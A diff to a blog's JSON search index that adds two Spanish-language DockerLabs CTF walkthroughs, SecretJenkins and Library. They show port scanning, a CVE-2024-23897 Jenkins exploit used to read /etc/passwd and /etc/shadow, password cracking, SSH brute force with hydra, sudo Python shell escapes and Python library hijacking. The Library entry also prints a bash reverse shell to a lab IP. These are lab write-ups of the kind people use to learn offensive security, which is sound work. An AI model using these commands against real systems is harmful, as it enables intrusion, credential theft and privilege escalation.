@@ -1,6 +1,40 @@
 [
   
   {
+    "title": "SecretJenkins , DockerLabs",
+    "url": "/posts/secretjenkins/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-10 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , explotacion de jenkins , obtencion de hashes ,crak password , escalada ...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , explotacion de jenkins , obtencion de hashes ,crak password , escalada con python.Herramientas y recursos usados  nmap  Feroxbuster  John the riper  scp  Python Library hijackingEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX SecretJenkinsReporte nmapNmap nos informa que tenemos el 22 abierto y el 8080 corriendo un servidor web con jenkins.Empezmos con jenkins intentando averiguar la version para ver si se puede explotar de algun modo.Lanzo whatwebYa sabemos la version ahora busquemos como explotarla.Explotacion jenkinsexploit CVE-2024-23897chmod +x jenkins_fileread.py./jenkins_fileread.py -u http://$ipvictimaLeemos y nos copiamos a nuestra maquina el contenido de /etc/passw y /etc/shadow.Craking con johnLos unimos haciendo uso de unshadowunshadow passwd shadow &gt; unshadowjohn unshadowInfiltracionTenemos suerte y cuando encuetra la pass de bobby corto el craking y entro con bobby.Nos aprovechamos de python para convertirnos en pinguino.sudo -u pinguinito python -c 'import os; os.system(\"/bin/sh\")'Ya somo el usuario pinguinito ahora toca ser root haber que encontramos.Escalada FinalComo vemos tenemos la misma escalada que en la maquina library.Asi que hacemos lo mismo heber si funciona tambien en esta.Nos creamos un script en python llamado shutil.py y lo añadimos al PATH , despues ejecutamos con sudo.Contenido del scriptimport os os.system(\"/bin/sh\")Directorio de trabajoEjecutamossudo /usr/bin/python3 /opt/script.shHasta aqui la maquinta , pls insert more coinsGracias por leer compartamos conocimiento."
+  },
+  
+  {
+    "title": "Library , DockerLabs",
+    "url": "/posts/library/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-10 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , library path hijacking python.Herramientas y recursos usados  nmap  Fer...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , library path hijacking python.Herramientas y recursos usados  nmap  Feroxbuster  Hydra  PythonEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX libraryReporte nmapNos dice que tenemos el 22 y el 80 primero revisamos la web a ver que encontramos es la de default y no hay nada , mientras revisamos codigo lanzamos feroxbuster.feroxbuster -t 400 -e -x php,txt,html,jpg,json,js -s 200 -u http://172.17.0.2Como podemos ver nos muestra un index php y un direcotorio js.investigamos la web.En index php nos tira un dato y la unica logica que veo es que sea una password y en los directorios no tenemos permisos de escritura.Solo se me ocurre usar hydra y rockyou dado que tambien teniamos el 22  abierto. hydra -L ../../../rockyou.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -t 4InfiltracionCon las credenciales ya podemos probar por ssh con los datos que nos dio hydra.Como siempre ni bien entramos comprobamos lo mas tipico , sudo , find ,script en directorios etc….con sudo -l tenemos suerteVamos a revisar que hace ese script.Como vemos llama a una libreia y esa es la parte que nos interesa.Explotacion y escalada final.Ahora que sabemos lo que hace y usa el script y conocemos como funciona el path, lo unico que tendremos que hacer sera trasladornos a un directorio donde tengamos permisos de escritura.Creamos un archivo con nombre  shutil.py , añadimos esa ruta al PATH y ejecutaremos el script con sudo.El contenido del la libreria que creamos puede variar dependiendo del objetivo que queramos. Lo mas facil para mi seria mandarme una revshell o modificar los permisos de bash con chmod +x y luego ejecutando bash -p  esto es a gusto.Primero creo mi libreria.import osos.system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1'\")Añadimos al PATH la ruta de la libreria nueva.Y por ultimo ejecutamos.Hasta aqui la maquina.Saludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz."
+  },
+  
+  {
     "title": "ChocolateLovers , DockerLabs",
     "url": "/posts/chocoletelovers/",
     "categories": "DockerLabs",
